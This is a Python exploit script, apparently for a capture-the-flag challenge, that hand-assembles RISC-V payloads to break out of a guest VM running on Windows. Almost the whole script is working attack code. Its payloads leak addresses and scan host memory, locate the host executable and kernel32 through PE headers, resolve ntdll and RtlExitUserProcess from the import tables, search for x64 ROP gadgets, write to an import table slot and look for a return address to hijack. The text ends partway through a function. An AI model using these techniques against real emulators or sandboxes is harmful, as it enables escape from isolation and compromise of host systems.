#!/usr/bin/env python3
import argparse
import base64
import struct
from pathlib import Path


REG = {
    "zero": 0, "ra": 1, "sp": 2, "gp": 3, "tp": 4,
    "t0": 5, "t1": 6, "t2": 7,
    "s0": 8, "fp": 8, "s1": 9,
    "a0": 10, "a1": 11, "a2": 12, "a3": 13, "a4": 14, "a5": 15,
    "a6": 16, "a7": 17,
    "s2": 18, "s3": 19, "s4": 20, "s5": 21, "s6": 22, "s7": 23,
    "s8": 24, "s9": 25, "s10": 26, "s11": 27,
    "t3": 28, "t4": 29, "t5": 30, "t6": 31,
}
for i in range(32):
    REG[f"x{i}"] = i


def r(x):
    if isinstance(x, int):
        return x
    return REG[x]


def check_signed(v, bits):
    lo = -(1 << (bits - 1))
    hi = (1 << (bits - 1)) - 1
    if not (lo <= v <= hi):
        raise ValueError(f"{v:#x} does not fit signed {bits}-bit")
    return v & ((1 << bits) - 1)


def check_unsigned(v, bits):
    if not (0 <= v < (1 << bits)):
        raise ValueError(f"{v:#x} does not fit unsigned {bits}-bit")
    return v


def pack(words):
    return b"".join(struct.pack("<I", w & 0xffffffff) for w in words)


class Asm:
    def __init__(self):
        self.words = []
        self.labels = {}
        self.fixups = []

    def emit(self, word):
        self.words.append(word)

    def extend(self, words):
        self.words.extend(words)

    def label(self, name):
        self.labels[name] = len(self.words) * 4

    def branch(self, op, rs1, rs2, label):
        self.fixups.append(("branch", len(self.words), op, rs1, rs2, label))
        self.words.append(0)

    def la(self, rd, label):
        self.fixups.append(("la", len(self.words), rd, label))
        self.words.extend([0, 0])

    def finish(self):
        for fixup in self.fixups:
            kind = fixup[0]
            if kind == "branch":
                _, idx, op, rs1, rs2, label = fixup
                here = idx * 4
                target = self.labels[label]
                self.words[idx] = op(rs1, rs2, target - here)
            elif kind == "la":
                _, idx, rd, label = fixup
                here = idx * 4
                target = self.labels[label]
                off = target - here
                hi = (off + 0x800) >> 12
                lo = off - (hi << 12)
                self.words[idx] = auipc(rd, hi & 0xfffff)
                self.words[idx + 1] = addi(rd, rd, lo)
            else:
                raise ValueError(f"unknown fixup kind {kind}")
        return pack(self.words)


def utype(opcode, rd, imm20):
    return (check_unsigned(imm20, 20) << 12) | (r(rd) << 7) | opcode


def itype(opcode, funct3, rd, rs1, imm):
    imm = check_signed(imm, 12)
    return (imm << 20) | (r(rs1) << 15) | (funct3 << 12) | (r(rd) << 7) | opcode


def rtype(opcode, funct3, funct7, rd, rs1, rs2):
    return (
        (funct7 << 25)
        | (r(rs2) << 20)
        | (r(rs1) << 15)
        | (funct3 << 12)
        | (r(rd) << 7)
        | opcode
    )


def stype(funct3, rs1, rs2, imm):
    imm = check_signed(imm, 12)
    return (
        ((imm >> 5) << 25)
        | (r(rs2) << 20)
        | (r(rs1) << 15)
        | (funct3 << 12)
        | ((imm & 0x1f) << 7)
        | 0x23
    )


def btype(funct3, rs1, rs2, imm):
    if imm % 2:
        raise ValueError("branch immediate must be 2-byte aligned")
    imm = check_signed(imm, 13)
    return (
        ((imm >> 12) & 1) << 31
        | ((imm >> 5) & 0x3f) << 25
        | (r(rs2) << 20)
        | (r(rs1) << 15)
        | (funct3 << 12)
        | ((imm >> 1) & 0xf) << 8
        | ((imm >> 11) & 1) << 7
        | 0x63
    )


def jtype(rd, imm):
    if imm % 2:
        raise ValueError("jump immediate must be 2-byte aligned")
    imm = check_signed(imm, 21)
    return (
        ((imm >> 20) & 1) << 31
        | ((imm >> 1) & 0x3ff) << 21
        | ((imm >> 11) & 1) << 20
        | ((imm >> 12) & 0xff) << 12
        | (r(rd) << 7)
        | 0x6f
    )


def lui(rd, imm20): return utype(0x37, rd, imm20)
def auipc(rd, imm20): return utype(0x17, rd, imm20)
def addi(rd, rs1, imm): return itype(0x13, 0, rd, rs1, imm)
def sltiu(rd, rs1, imm): return itype(0x13, 3, rd, rs1, imm)
def xori(rd, rs1, imm): return itype(0x13, 4, rd, rs1, imm)
def ori(rd, rs1, imm): return itype(0x13, 6, rd, rs1, imm)
def andi(rd, rs1, imm): return itype(0x13, 7, rd, rs1, imm)
def slli(rd, rs1, shamt): return itype(0x13, 1, rd, rs1, check_unsigned(shamt, 6))
def srli(rd, rs1, shamt): return itype(0x13, 5, rd, rs1, check_unsigned(shamt, 6))
def srai(rd, rs1, shamt): return itype(0x13, 5, rd, rs1, check_unsigned(shamt, 6) | 0x400)
def add(rd, rs1, rs2): return rtype(0x33, 0, 0x00, rd, rs1, rs2)
def sub(rd, rs1, rs2): return rtype(0x33, 0, 0x20, rd, rs1, rs2)
def mul(rd, rs1, rs2): return rtype(0x33, 0, 0x01, rd, rs1, rs2)
def divu(rd, rs1, rs2): return rtype(0x33, 5, 0x01, rd, rs1, rs2)
def remu(rd, rs1, rs2): return rtype(0x33, 7, 0x01, rd, rs1, rs2)
def or_(rd, rs1, rs2): return rtype(0x33, 6, 0x00, rd, rs1, rs2)
def and_(rd, rs1, rs2): return rtype(0x33, 7, 0x00, rd, rs1, rs2)
def xor_(rd, rs1, rs2): return rtype(0x33, 4, 0x00, rd, rs1, rs2)
def lbu(rd, rs1, imm=0): return itype(0x03, 4, rd, rs1, imm)
def lhu(rd, rs1, imm=0): return itype(0x03, 5, rd, rs1, imm)
def lw(rd, rs1, imm=0): return itype(0x03, 2, rd, rs1, imm)
def lwu(rd, rs1, imm=0): return itype(0x03, 6, rd, rs1, imm)
def ld(rd, rs1, imm=0): return itype(0x03, 3, rd, rs1, imm)
def sb(rs2, rs1, imm=0): return stype(0, rs1, rs2, imm)
def sh(rs2, rs1, imm=0): return stype(1, rs1, rs2, imm)
def sw(rs2, rs1, imm=0): return stype(2, rs1, rs2, imm)
def sd(rs2, rs1, imm=0): return stype(3, rs1, rs2, imm)
def beq(rs1, rs2, imm): return btype(0, rs1, rs2, imm)
def bne(rs1, rs2, imm): return btype(1, rs1, rs2, imm)
def bltu(rs1, rs2, imm): return btype(6, rs1, rs2, imm)
def bgeu(rs1, rs2, imm): return btype(7, rs1, rs2, imm)
def jal(rd, imm): return jtype(rd, imm)
def jalr(rd, rs1, imm=0): return itype(0x67, 0, rd, rs1, imm)
def ecall(): return 0x00000073


def li32(rd, value):
    value &= 0xffffffff
    if value & 0x80000000:
        signed = value - (1 << 32)
    else:
        signed = value
    hi = (signed + 0x800) >> 12
    lo = signed - (hi << 12)
    return [lui(rd, hi & 0xfffff), addi(rd, rd, lo)]


def li64(rd, value):
    value &= 0xffffffffffffffff
    # Compact forms for the constants used by this challenge.
    if value < (1 << 31):
        return li32(rd, value)
    if value == 0x140000000:
        return [lui(rd, 0x14000), slli(rd, rd, 4)]
    if value == 0x80000000:
        return [lui(rd, 0x40000), slli(rd, rd, 1)]
    if value == 0x7ffe0000:
        return [lui(rd, 0x7ffe0)]
    if value == 0x4141414141414141:
        return [
            addi(rd, "zero", 0x414),
            slli(rd, rd, 12),
            addi(rd, rd, 0x141),
            slli(rd, rd, 12),
            addi(rd, rd, 0x414),
            slli(rd, rd, 12),
            addi(rd, rd, 0x141),
        ]
    raise ValueError(f"li64 does not know how to build {value:#x}")


def sys_print_hex(reg="a0"):
    out = []
    if r(reg) != REG["a0"]:
        out.append(addi("a0", reg, 0))
    out += [addi("a7", "zero", 101), ecall()]
    return out


def sys_print_dec(reg="a0"):
    out = []
    if r(reg) != REG["a0"]:
        out.append(addi("a0", reg, 0))
    out += [addi("a7", "zero", 102), ecall()]
    return out


def sys_print_str(reg="a0"):
    out = []
    if r(reg) != REG["a0"]:
        out.append(addi("a0", reg, 0))
    out += [addi("a7", "zero", 100), ecall()]
    return out


def sys_nl():
    return [addi("a7", "zero", 103), ecall()]


def sys_exit():
    return [addi("a7", "zero", 0x5d), ecall()]


def p_leak_pc():
    return pack([auipc("a0", 0)] + sys_print_hex() + sys_nl() + sys_exit())


def p_read_image_base():
    w = []
    w += li64("t0", 0x140000000)
    w += [ld("a0", "t0", 0)]
    w += sys_print_hex()
    w += sys_nl()
    w += sys_exit()
    return pack(w)


def p_read_80000000():
    w = []
    w += li64("t0", 0x80000000)
    w += [ld("a0", "t0", 0)]
    w += sys_print_hex()
    w += sys_nl()
    w += sys_exit()
    return pack(w)


def p_heap_rw():
    w = []
    w += li64("t0", 0x4141414141414141)
    w += [sd("t0", "sp", -8), ld("a0", "sp", -8)]
    w += sys_print_hex()
    w += sys_nl()
    w += sys_exit()
    return pack(w)


def p_read_ctx():
    w = []
    w += [auipc("t0", 0), addi("t0", "t0", -0x110), ld("a0", "t0", 0)]
    w += sys_print_hex()
    w += sys_nl()
    w += sys_exit()
    return pack(w)


def p_scan_ctx():
    w = [auipc("t0", 0), addi("t0", "t0", -0x110)]
    for off in range(-0x200, 0x401, 8):
        w += [ld("a0", "t0", off)]
        w += sys_print_hex()
        w += sys_nl()
    w += sys_exit()
    return pack(w)


def p_scan_kuser():
    w = []
    w += li64("t0", 0x7ffe0000)
    for off in range(0, 0x401, 8):
        w += [ld("a0", "t0", off)]
        w += sys_print_hex()
        w += sys_nl()
    w += sys_exit()
    return pack(w)


def p_loop():
    return pack([jal("zero", 0)])


def p_scan_heap_ptrs():
    a = Asm()
    a.extend([auipc("t0", 0), addi("t0", "t0", -0x110)])
    a.extend(li32("t4", -0x10000))
    a.emit(add("t0", "t0", "t4"))
    a.extend(li32("t1", 0x40000 // 8))
    a.label("loop")
    a.emit(ld("t2", "t0", 0))
    a.branch(beq, "t2", "zero", "skip")
    a.emit(srli("t3", "t2", 48))
    a.branch(bne, "t3", "zero", "skip")
    a.extend(sys_print_hex("t0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.label("skip")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "loop")
    a.extend(sys_exit())
    return a.finish()


def emit_add_const(a, rd, rs, value, tmp="t6"):
    a.extend(li32(tmp, value))
    a.emit(add(rd, rs, tmp))


def emit_find_main_base(a, out="s0", ctx="s1"):
    # Scan the loader metadata that sits shortly before the VM heap allocation.
    # Candidate module bases are high canonical, page-aligned pointers whose
    # memory starts with MZ/PE and contains this executable's import string.
    a.extend([auipc(ctx, 0), addi(ctx, ctx, -0x110)])
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", ctx, "t0"))
    a.extend(li32("t1", 0x18000 // 8))
    a.label("find_base_loop")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 44))
    a.emit(addi("t4", "zero", 7))
    a.branch(bne, "t3", "t4", "find_base_next")
    a.emit(srli("t3", "t2", 12))
    a.emit(slli("t3", "t3", 12))
    a.branch(bne, "t3", "t2", "find_base_next")
    a.emit(ld("t5", "t0", -8))
    emit_add_const(a, "t5", "t5", 0x1000)
    a.branch(beq, "t5", "t2", "find_base_next")
    a.emit(ld("t5", "t0", 8))
    emit_add_const(a, "t3", "t2", 0x1000)
    a.branch(beq, "t5", "t3", "find_base_next")

    a.emit(lhu("t3", "t2", 0))
    a.extend(li32("t4", 0x5a4d))
    a.branch(bne, "t3", "t4", "find_base_next")
    a.emit(lwu("t3", "t2", 0x3c))
    a.extend(li32("t4", 0x1000))
    a.branch(bgeu, "t3", "t4", "find_base_next")
    a.emit(add("t5", "t2", "t3"))
    a.emit(lwu("t3", "t5", 0))
    a.extend(li32("t4", 0x4550))
    a.branch(bne, "t3", "t4", "find_base_next")

    a.emit(lwu("t3", "t5", 0x50))
    a.extend(li32("t4", 0x3000))
    a.branch(bltu, "t3", "t4", "find_base_next")
    emit_add_const(a, "t5", "t2", 0x239a)
    a.emit(lwu("t3", "t5", 0))
    a.extend(li32("t4", 0x4e52454b))  # "KERN"
    a.branch(bne, "t3", "t4", "find_base_next")
    a.emit(addi(out, "t2", 0))
    a.branch(beq, "zero", "zero", "find_base_done")

    a.label("find_base_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "find_base_loop")
    a.emit(addi(out, "zero", 0))
    a.label("find_base_done")


def p_find_base():
    a = Asm()
    emit_find_main_base(a)
    a.extend(sys_print_hex("s0"))
    a.extend(sys_nl())
    a.extend(sys_exit())
    return a.finish()


def p_test_iat_write():
    a = Asm()
    emit_find_main_base(a)
    a.branch(beq, "s0", "zero", "no_base")
    a.extend(sys_print_hex("s0"))
    a.extend(sys_nl())
    emit_add_const(a, "t0", "s0", 0x2018)
    a.emit(ld("t1", "t0", 0))
    a.emit(sd("t1", "t0", 0))
    a.extend(sys_print_hex("t1"))
    a.extend(sys_nl())
    a.label("no_base")
    a.extend(sys_exit())
    return a.finish()


def p_scan_page_candidates():
    a = Asm()
    a.extend([auipc("s1", 0), addi("s1", "s1", -0x110)])
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", "s1", "t0"))
    a.extend(li32("t1", 0x18000 // 8))
    a.label("cand_loop")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 44))
    a.emit(addi("t4", "zero", 7))
    a.branch(bne, "t3", "t4", "cand_next")
    a.emit(srli("t3", "t2", 12))
    a.emit(slli("t3", "t3", 12))
    a.branch(bne, "t3", "t2", "cand_next")
    a.extend(sys_print_hex("t0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.label("cand_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "cand_loop")
    a.extend(sys_exit())
    return a.finish()


def p_debug_deref_candidates():
    a = Asm()
    a.extend([auipc("s1", 0), addi("s1", "s1", -0x110)])
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", "s1", "t0"))
    a.extend(li32("t1", 0x1000 // 8))
    a.label("dbg_loop")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 44))
    a.emit(addi("t4", "zero", 7))
    a.branch(bne, "t3", "t4", "dbg_next")
    a.emit(srli("t3", "t2", 12))
    a.emit(slli("t3", "t3", 12))
    a.branch(bne, "t3", "t2", "dbg_next")
    a.extend(sys_print_hex("t0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.emit(lhu("a0", "t2", 0))
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())
    a.label("dbg_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "dbg_loop")
    a.extend(sys_exit())
    return a.finish()


def p_scan_stack_like():
    a = Asm()
    a.extend([auipc("s1", 0), addi("s1", "s1", -0x110)])
    a.emit(srli("s2", "s1", 32))
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", "s1", "t0"))
    a.extend(li32("t1", 0x30000 // 8))
    a.label("stk_loop")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 32))
    a.branch(beq, "t3", "zero", "stk_next")
    a.branch(beq, "t3", "s2", "stk_next")
    a.emit(srli("t4", "t2", 44))
    a.emit(addi("t5", "zero", 7))
    a.branch(beq, "t4", "t5", "stk_next")
    a.emit(srli("t3", "t2", 4))
    a.emit(slli("t3", "t3", 4))
    a.branch(bne, "t3", "t2", "stk_next")
    a.extend(sys_print_hex("t0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.label("stk_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "stk_loop")
    a.extend(sys_exit())
    return a.finish()


def p_scan_low_ptrs():
    a = Asm()
    a.extend([auipc("s1", 0), addi("s1", "s1", -0x110)])
    a.emit(srli("s2", "s1", 32))
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", "s1", "t0"))
    a.extend(li32("t1", 0x30000 // 8))
    a.label("low_loop")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 47))
    a.branch(bne, "t3", "zero", "low_next")
    a.emit(srli("t3", "t2", 32))
    a.branch(beq, "t3", "zero", "low_next")
    a.branch(beq, "t3", "s2", "low_next")
    a.emit(srli("t4", "t2", 44))
    a.emit(addi("t5", "zero", 7))
    a.branch(beq, "t4", "t5", "low_next")
    a.emit(srli("t3", "t2", 4))
    a.emit(slli("t3", "t3", 4))
    a.branch(bne, "t3", "t2", "low_next")
    a.extend(sys_print_hex("t0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.label("low_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "low_loop")
    a.extend(sys_exit())
    return a.finish()


def p_scan_return_addrs():
    a = Asm()
    emit_find_main_base(a)
    a.extend(sys_print_hex("s0"))
    a.extend(sys_nl())
    emit_add_const(a, "s3", "s0", 0x1000)
    emit_add_const(a, "s4", "s0", 0x1d00)
    a.emit(srli("s2", "s1", 32))
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", "s1", "t0"))
    a.extend(li32("t1", 0x30000 // 8))
    a.label("ret_outer")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 47))
    a.branch(bne, "t3", "zero", "ret_outer_next")
    a.emit(srli("t3", "t2", 32))
    a.branch(beq, "t3", "zero", "ret_outer_next")
    a.emit(addi("t4", "zero", 0x10))
    a.branch(bltu, "t3", "t4", "ret_outer_next")
    a.extend(li32("t4", 0x100))
    a.branch(bgeu, "t3", "t4", "ret_outer_next")
    a.branch(beq, "t3", "s2", "ret_outer_next")
    a.emit(srli("t4", "t2", 44))
    a.emit(addi("t5", "zero", 7))
    a.branch(beq, "t4", "t5", "ret_outer_next")
    a.emit(srli("t3", "t2", 4))
    a.emit(slli("t3", "t3", 4))
    a.branch(bne, "t3", "t2", "ret_outer_next")
    a.emit(slli("t3", "t2", 48))
    a.emit(srli("t3", "t3", 48))
    a.extend(li32("t4", 0x1000))
    a.branch(bltu, "t3", "t4", "ret_outer_next")

    a.emit(addi("t5", "t2", 0))
    a.emit(srli("t3", "t2", 12))
    a.emit(slli("t3", "t3", 12))
    a.emit(sub("t3", "t2", "t3"))
    a.extend(li32("t4", 0x1000))
    a.emit(sub("t6", "t4", "t3"))
    a.emit(srli("t6", "t6", 3))
    a.label("ret_inner")
    a.emit(ld("a6", "t5", 0))
    a.branch(bltu, "a6", "s3", "ret_inner_next")
    a.branch(bgeu, "a6", "s4", "ret_inner_next")
    a.extend(sys_print_hex("t0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("t5"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("a6"))
    a.extend(sys_nl())
    a.label("ret_inner_next")
    a.emit(addi("t5", "t5", 8))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "ret_inner")

    a.label("ret_outer_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "ret_outer")
    a.extend(sys_exit())
    return a.finish()


def p_debug_return_scan():
    a = Asm()
    emit_find_main_base(a)
    a.extend(sys_print_hex("s0"))
    a.extend(sys_nl())
    a.emit(srli("s2", "s1", 32))
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", "s1", "t0"))
    a.extend(li32("t1", 0x30000 // 8))
    a.label("dr_outer")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 47))
    a.branch(bne, "t3", "zero", "dr_next")
    a.emit(srli("t3", "t2", 32))
    a.branch(beq, "t3", "zero", "dr_next")
    a.emit(addi("t4", "zero", 0x10))
    a.branch(bltu, "t3", "t4", "dr_next")
    a.extend(li32("t4", 0x100))
    a.branch(bgeu, "t3", "t4", "dr_next")
    a.branch(beq, "t3", "s2", "dr_next")
    a.emit(srli("t4", "t2", 44))
    a.emit(addi("t5", "zero", 7))
    a.branch(beq, "t4", "t5", "dr_next")
    a.emit(srli("t3", "t2", 4))
    a.emit(slli("t3", "t3", 4))
    a.branch(bne, "t3", "t2", "dr_next")
    a.emit(slli("t3", "t2", 48))
    a.emit(srli("t3", "t3", 48))
    a.extend(li32("t4", 0x1000))
    a.branch(bltu, "t3", "t4", "dr_next")
    a.extend(sys_print_hex("t0"))
    a.extend(sys_nl())
    a.extend(sys_print_hex("t2"))
    a.extend(sys_nl())
    a.emit(ld("a0", "t2", 0))
    a.extend(sys_print_hex("a0"))
    a.extend(sys_nl())
    a.label("dr_next")
    a.emit(addi("t0", "t0", 8))
    a.emit(addi("t1", "t1", -1))
    a.branch(bne, "t1", "zero", "dr_outer")
    a.extend(sys_exit())
    return a.finish()


def emit_iat_addr(a, rd, main_base, rva):
    emit_add_const(a, rd, main_base, rva)


def emit_find_module_base_from_ptr(a, ptr_reg, out="s2", tag="mod"):
    a.emit(srli(out, ptr_reg, 12))
    a.emit(slli(out, out, 12))
    a.extend(li32("t6", 0x2000))
    a.label(f"{tag}_base_loop")
    a.emit(lhu("t3", out, 0))
    a.extend(li32("t4", 0x5a4d))
    a.branch(beq, "t3", "t4", f"{tag}_base_done")
    emit_add_const(a, out, out, -0x1000)
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", f"{tag}_base_loop")
    a.emit(addi(out, "zero", 0))
    a.label(f"{tag}_base_done")


def emit_module_end(a, base_reg="s2", end_reg="s3"):
    a.emit(lwu("t3", base_reg, 0x3c))
    a.emit(add("t4", base_reg, "t3"))
    a.emit(lwu("t5", "t4", 0x50))
    a.emit(add(end_reg, base_reg, "t5"))


def emit_scan_api_gadgets(a):
    # s2 = module base, s3 = module end
    # s5/s6/s7/s8/s9/s10 = pop rcx/pop rdx/pop r8/pop r9/mov rcx,rax/add rsp,38
    a.emit(addi("s5", "zero", 0))
    a.emit(addi("s6", "zero", 0))
    a.emit(addi("s7", "zero", 0))
    a.emit(addi("s8", "zero", 0))
    a.emit(addi("s9", "zero", 0))
    a.emit(addi("s10", "zero", 0))
    a.emit(addi("t0", "s2", 0))
    a.label("gad_loop")
    a.branch(bgeu, "t0", "s3", "gad_done")
    a.emit(lhu("t1", "t0", 0))
    a.extend(li32("t2", 0xC359))
    a.branch(bne, "t1", "t2", "not_pop_rcx")
    a.emit(addi("s5", "t0", 0))
    a.label("not_pop_rcx")
    a.extend(li32("t2", 0xC35A))
    a.branch(bne, "t1", "t2", "not_pop_rdx")
    a.emit(addi("s6", "t0", 0))
    a.label("not_pop_rdx")

    a.emit(lwu("t1", "t0", 0))
    a.emit(slli("t3", "t1", 40))
    a.emit(srli("t3", "t3", 40))
    a.extend(li32("t2", 0xC35841))
    a.branch(bne, "t3", "t2", "not_pop_r8")
    a.emit(addi("s7", "t0", 0))
    a.label("not_pop_r8")
    a.extend(li32("t2", 0xC35941))
    a.branch(bne, "t3", "t2", "not_pop_r9")
    a.emit(addi("s8", "t0", 0))
    a.label("not_pop_r9")

    a.extend(li32("t2", 0xC3C18948))
    a.branch(beq, "t1", "t2", "set_mov_rcx_rax")
    a.extend(li32("t2", 0xC3C88B48))
    a.branch(bne, "t1", "t2", "not_mov_rcx_rax")
    a.label("set_mov_rcx_rax")
    a.emit(addi("s9", "t0", 0))
    a.label("not_mov_rcx_rax")

    a.extend(li32("t2", 0x38C48348))
    a.branch(bne, "t1", "t2", "not_add_rsp")
    a.emit(lbu("t3", "t0", 4))
    a.extend(li32("t2", 0xC3))
    a.branch(bne, "t3", "t2", "not_add_rsp")
    a.emit(addi("s10", "t0", 0))
    a.label("not_add_rsp")

    a.branch(beq, "s5", "zero", "gad_next")
    a.branch(beq, "s6", "zero", "gad_next")
    a.branch(beq, "s7", "zero", "gad_next")
    a.branch(beq, "s8", "zero", "gad_next")
    a.branch(beq, "s9", "zero", "gad_next")
    a.branch(beq, "s10", "zero", "gad_next")
    a.branch(beq, "zero", "zero", "gad_done")
    a.label("gad_next")
    a.emit(addi("t0", "t0", 1))
    a.branch(beq, "zero", "zero", "gad_loop")
    a.label("gad_done")


def le_const(data):
    if isinstance(data, str):
        data = data.encode()
    return int.from_bytes(data, "little")


def emit_write_bytes(a, base, data, tmp="t0"):
    for off, b in enumerate(data):
        if b:
            a.emit(addi(tmp, "zero", b))
        else:
            a.emit(addi(tmp, "zero", 0))
        a.emit(sb(tmp, base, off))


def emit_pe_text_bounds(a, base_reg, start_out, end_out):
    a.emit(lwu("t0", base_reg, 0x3c))
    a.emit(add("t1", base_reg, "t0"))
    a.emit(lwu("t2", "t1", 0x2c))  # OptionalHeader.BaseOfCode
    a.emit(lwu("t3", "t1", 0x1c))  # OptionalHeader.SizeOfCode
    a.emit(add(start_out, base_reg, "t2"))
    a.emit(add(end_out, start_out, "t3"))


def emit_find_pop_rcx(a, ntdll_base="s2", out="s5"):
    emit_pe_text_bounds(a, ntdll_base, "t0", "t1")
    a.emit(addi(out, "zero", 0))
    a.label("find_pop_rcx_loop")
    a.branch(bgeu, "t0", "t1", "find_pop_rcx_done")
    a.emit(lhu("t2", "t0", 0))
    a.extend(li32("t3", 0xC359))
    a.branch(bne, "t2", "t3", "find_pop_rcx_next")
    a.emit(addi(out, "t0", 0))
    a.branch(beq, "zero", "zero", "find_pop_rcx_done")
    a.label("find_pop_rcx_next")
    a.emit(addi("t0", "t0", 1))
    a.branch(beq, "zero", "zero", "find_pop_rcx_loop")
    a.label("find_pop_rcx_done")


def emit_find_ntdll_and_exitproc_from_kernel32(a, k32_base="s2", ntdll_out="s3", exit_out="s6"):
    # Walk kernel32's import descriptors. For the ntdll descriptor, the first
    # resolved thunk gives an ntdll code pointer; the matching name thunk gives
    # RtlExitUserProcess.
    a.emit(addi(ntdll_out, "zero", 0))
    a.emit(addi(exit_out, "zero", 0))
    a.emit(lwu("t0", k32_base, 0x3c))
    a.emit(add("t1", k32_base, "t0"))
    a.emit(lwu("t2", "t1", 0x90))  # OptionalHeader.DataDirectory[IMPORT].VirtualAddress
    a.emit(add("t2", k32_base, "t2"))
    a.extend(li32("t6", 96))
    a.label("imp_desc_loop")
    a.emit(lwu("t3", "t2", 12))
    a.branch(beq, "t3", "zero", "imp_desc_done")
    a.emit(add("t4", k32_base, "t3"))
    a.emit(lwu("t5", "t4", 0))
    a.extend(li32("t0", le_const(b"ntdl")))
    a.branch(bne, "t5", "t0", "imp_desc_next")
    a.emit(lwu("t5", "t4", 4))
    a.extend(li32("t0", le_const(b"l.dl")))
    a.branch(bne, "t5", "t0", "imp_desc_next")
    a.emit(lbu("t5", "t4", 8))
    a.emit(addi("t0", "zero", ord("l")))
    a.branch(bne, "t5", "t0", "imp_desc_next")

    a.emit(lwu("t3", "t2", 16))
    a.emit(add("t4", k32_base, "t3"))  # FirstThunk VA
    a.emit(ld("a6", "t4", 0))
    emit_find_module_base_from_ptr(a, "a6", ntdll_out, tag="ntdll")

    a.emit(lwu("t3", "t2", 0))
    a.emit(add("t5", k32_base, "t3"))  # OriginalFirstThunk VA
    a.emit(lwu("t3", "t2", 16))
    a.emit(add("a6", k32_base, "t3"))  # FirstThunk cursor
    a.extend(li32("t6", 512))
    a.label("imp_thunk_loop")
    a.emit(ld("t0", "t5", 0))
    a.branch(beq, "t0", "zero", "imp_desc_done")
    a.emit(add("t1", k32_base, "t0"))  # IMAGE_IMPORT_BY_NAME
    a.emit(lwu("t3", "t1", 2))
    a.extend(li32("t0", le_const(b"RtlE")))
    a.branch(bne, "t3", "t0", "imp_thunk_next")
    a.emit(lwu("t3", "t1", 6))
    a.extend(li32("t0", le_const(b"xitU")))
    a.branch(bne, "t3", "t0", "imp_thunk_next")
    a.emit(lwu("t3", "t1", 10))
    a.extend(li32("t0", le_const(b"serP")))
    a.branch(bne, "t3", "t0", "imp_thunk_next")
    a.emit(lwu("t3", "t1", 14))
    a.extend(li32("t0", le_const(b"roce")))
    a.branch(bne, "t3", "t0", "imp_thunk_next")
    a.emit(lhu("t3", "t1", 18))
    a.extend(li32("t0", le_const(b"ss")))
    a.branch(bne, "t3", "t0", "imp_thunk_next")
    a.emit(ld(exit_out, "a6", 0))
    a.branch(beq, "zero", "zero", "imp_desc_done")
    a.label("imp_thunk_next")
    a.emit(addi("t5", "t5", 8))
    a.emit(addi("a6", "a6", 8))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "imp_thunk_loop")
    a.branch(beq, "zero", "zero", "imp_desc_done")

    a.label("imp_desc_next")
    a.emit(addi("t2", "t2", 20))
    a.emit(addi("t6", "t6", -1))
    a.branch(bne, "t6", "zero", "imp_desc_loop")
    a.label("imp_desc_done")


def emit_find_execute_ret_slot(a, main_base="s0", ctx="s1", out="s4"):
    emit_add_const(a, "s3", main_base, 0x1ccc)
    a.emit(srli("s2", ctx, 32))
    a.extend(li32("t0", -0x10000))
    a.emit(add("t0", ctx, "t0"))
    a.extend(li32("t1", 0x30000 // 8))
    a.emit(addi(out, "zero", 0))
    a.label("find_ret_outer")
    a.branch(beq, out, "zero", "find_ret_continue_outer")
    a.branch(beq, "zero", "zero", "find_ret_done")
    a.label("find_ret_continue_outer")
    a.emit(ld("t2", "t0", 0))
    a.emit(srli("t3", "t2", 47))
    a.branch(bne, "t3", "zero", "find_ret_outer_next")
    a.emit(srli("t3", "t2", 32))
    a.branch(beq, "t3", "zero", "find_ret_outer_next")
    a.emit(addi("t4", "zero", 0x10))
    a.branch(bltu, "t3", "t4", "find_ret_outer_next")
    a.extend(li32("t4", 0x100))
    a.branch(bgeu, "t3", "t4", "find_ret_outer_next")
    a.branch(beq, "t3", "s2", "find_ret_outer_next")
    a.emit(srli("t4", "t2", 44))
    a.emit(addi("t5", "zero", 7))
    a.branch(beq, "t4", "t5", "find_ret_outer_next")
    a.emit(srli("t3", "t2", 4))
    a.emit(slli("t3", "t3", 4))
    a.branch(bne, "t3", "t2", "find_ret_outer_next")
